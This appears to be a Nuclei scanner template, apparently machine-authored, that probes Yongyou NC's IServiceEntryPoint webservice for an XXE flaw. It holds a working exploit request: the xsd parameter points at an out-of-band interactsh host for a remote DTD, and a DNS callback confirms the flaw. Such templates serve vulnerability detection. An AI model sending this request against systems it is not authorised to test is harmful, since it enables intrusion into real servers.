id: yongyou-nc-iserviceentrypoint-xxe
info:
  name: Yongyou NC IServiceEntryPoint XXE Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: xxe,dnslog
http:
  - raw:
      - |
        GET /uapws/service/nc.uap.oba.word.webservice.IServiceEntryPoint?xsd=http://{{interactsh-url}}/ext.dtd HTTP/1.1
        Host: {{Hostname}}
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
